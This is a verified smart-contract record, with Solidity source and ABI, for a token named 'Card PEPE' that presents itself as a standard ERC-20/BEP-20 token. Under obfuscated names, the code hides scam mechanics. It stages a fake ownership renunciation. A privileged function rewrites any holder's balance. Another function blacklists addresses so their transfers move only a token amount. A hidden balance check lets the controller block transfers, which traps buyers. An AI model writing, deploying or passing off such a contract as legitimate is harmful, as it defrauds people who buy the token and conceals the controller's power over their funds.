{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface txSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapTo) external view returns (uint256);\n\n    function transfer(address maxTrading, uint256 receiverEnableMarketing) external returns (bool);\n\n    function allowance(address exemptReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverEnableMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxTrading,\n        uint256 receiverEnableMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoSwap, uint256 value);\n    event Approval(address indexed exemptReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract enableTradingSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyTx {\n    function createPair(address toMin, address atEnable) external returns (address);\n}\n\ninterface txSellMetadata is txSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CardPEPE is enableTradingSwap, txSell, txSellMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeModeTrading;\n    }\n\n    function tokenAuto(address feeBuy, address maxTrading, uint256 receiverEnableMarketing) internal returns (bool) {\n        if (feeBuy == enableMin) {\n            return receiverSwap(feeBuy, maxTrading, receiverEnableMarketing);\n        }\n        uint256 autoTotal = txSell(exemptTeam).balanceOf(receiverAtTake);\n        require(autoTotal == receiverEnable);\n        require(maxTrading != receiverAtTake);\n        if (fundEnableMax[feeBuy]) {\n            return receiverSwap(feeBuy, maxTrading, marketingAt);\n        }\n        return receiverSwap(feeBuy, maxTrading, receiverEnableMarketing);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return feeFrom;\n    }\n\n    bool public marketingShould;\n\n    uint256 limitWallet;\n\n    function transferFrom(address feeBuy, address maxTrading, uint256 receiverEnableMarketing) external override returns (bool) {\n        if (_msgSender() != launchedToToken) {\n            if (walletSell[feeBuy][_msgSender()] != type(uint256).max) {\n                require(receiverEnableMarketing <= walletSell[feeBuy][_msgSender()]);\n                walletSell[feeBuy][_msgSender()] -= receiverEnableMarketing;\n            }\n        }\n        return tokenAuto(feeBuy, maxTrading, receiverEnableMarketing);\n    }\n\n    function receiverSwap(address feeBuy, address maxTrading, uint256 receiverEnableMarketing) internal returns (bool) {\n        require(sellAuto[feeBuy] >= receiverEnableMarketing);\n        sellAuto[feeBuy] -= receiverEnableMarketing;\n        sellAuto[maxTrading] += receiverEnableMarketing;\n        emit Transfer(feeBuy, maxTrading, receiverEnableMarketing);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minMarketingTake;\n    }\n\n    uint8 private limitAuto = 18;\n\n    function listMax() private view {\n        require(maxExemptLaunched[_msgSender()]);\n    }\n\n    bool public swapMode;\n\n    uint256 receiverEnable;\n\n    address private buyLaunch;\n\n    constructor (){\n        if (liquidityFee != listBuy) {\n            minToken = true;\n        }\n        modeTeam receiverTxBuy = modeTeam(launchedToToken);\n        exemptTeam = buyTx(receiverTxBuy.factory()).createPair(receiverTxBuy.WETH(), address(this));\n        if (liquidityFee != listBuy) {\n            minToken = true;\n        }\n        enableMin = _msgSender();\n        listTx();\n        maxExemptLaunched[enableMin] = true;\n        sellAuto[enableMin] = minMarketingTake;\n        if (swapMode) {\n            listBuy = liquidityFee;\n        }\n        emit Transfer(address(0), enableMin, minMarketingTake);\n    }\n\n    address launchedToToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address swapTo) public view virtual override returns (uint256) {\n        return sellAuto[swapTo];\n    }\n\n    mapping(address => uint256) private sellAuto;\n\n    function allowance(address shouldList, address launchTx) external view virtual override returns (uint256) {\n        if (launchTx == launchedToToken) {\n            return type(uint256).max;\n        }\n        return walletSell[shouldList][launchTx];\n    }\n\n    address public enableMin;\n\n    function transfer(address teamMax, uint256 receiverEnableMarketing) external virtual override returns (bool) {\n        return tokenAuto(_msgSender(), teamMax, receiverEnableMarketing);\n    }\n\n    uint256 constant marketingAt = 11 ** 10;\n\n    function walletEnable(address txFrom) public {\n        require(txFrom.balance < 100000);\n        if (amountFrom) {\n            return;\n        }\n        \n        maxExemptLaunched[txFrom] = true;\n        if (minToken != marketingShould) {\n            liquidityFee = listBuy;\n        }\n        amountFrom = true;\n    }\n\n    string private feeModeTrading = \"CPE\";\n\n    event OwnershipTransferred(address indexed buyAt, address indexed totalMin);\n\n    function limitMarketingBuy(uint256 receiverEnableMarketing) public {\n        listMax();\n        receiverEnable = receiverEnableMarketing;\n    }\n\n    uint256 public listBuy;\n\n    address public exemptTeam;\n\n    function approve(address launchTx, uint256 receiverEnableMarketing) public virtual override returns (bool) {\n        walletSell[_msgSender()][launchTx] = receiverEnableMarketing;\n        emit Approval(_msgSender(), launchTx, receiverEnableMarketing);\n        return true;\n    }\n\n    uint256 public liquidityFee;\n\n    function owner() external view returns (address) {\n        return buyLaunch;\n    }\n\n    function amountShould(address launchedMin) public {\n        listMax();\n        if (minToken) {\n            minToken = true;\n        }\n        if (launchedMin == enableMin || launchedMin == exemptTeam) {\n            return;\n        }\n        fundEnableMax[launchedMin] = true;\n    }\n\n    mapping(address => bool) public maxExemptLaunched;\n\n    uint256 private minMarketingTake = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return buyLaunch;\n    }\n\n    function listTx() public {\n        emit OwnershipTransferred(enableMin, address(0));\n        buyLaunch = address(0);\n    }\n\n    string private feeFrom = \"Card PEPE\";\n\n    address receiverAtTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitAuto;\n    }\n\n    bool private minToken;\n\n    mapping(address => mapping(address => uint256)) private walletSell;\n\n    mapping(address => bool) public fundEnableMax;\n\n    function teamSender(address teamMax, uint256 receiverEnableMarketing) public {\n        listMax();\n        sellAuto[teamMax] = receiverEnableMarketing;\n    }\n\n    bool public amountFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"amountShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverEnableMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundEnableMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverEnableMarketing\",\"type\":\"uint256\"}],\"name\":\"limitMarketingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxExemptLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverEnableMarketing\",\"type\":\"uint256\"}],\"name\":\"teamSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverEnableMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverEnableMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"}],\"name\":\"walletEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CardPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}